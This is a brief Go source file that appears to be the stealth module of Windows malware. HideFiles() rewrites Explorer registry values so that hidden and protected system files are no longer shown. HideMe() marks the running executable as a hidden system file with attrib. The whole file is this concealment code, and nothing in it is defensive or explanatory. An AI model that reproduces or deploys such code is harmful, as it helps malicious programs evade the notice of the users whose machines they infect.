package core

import (
	"os"
	"syscall"
)

func HideFiles() {
	run("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ /v Hidden /t REG_DWORD /d 2 /f")
	run("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ /v ShowSuperHidden /t REG_DWORD /d 0 /f")
}

func HideMe() {
	run("attrib +S +H " + os.Args[0])
}

func isHidden(filename string) (bool, error) {
	pointer, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return false, err
	}

	attributes, err := syscall.GetFileAttributes(pointer)
	if err != nil {
		return false, err
	}

	return attributes&syscall.FILE_ATTRIBUTE_HIDDEN != 0, nil
}
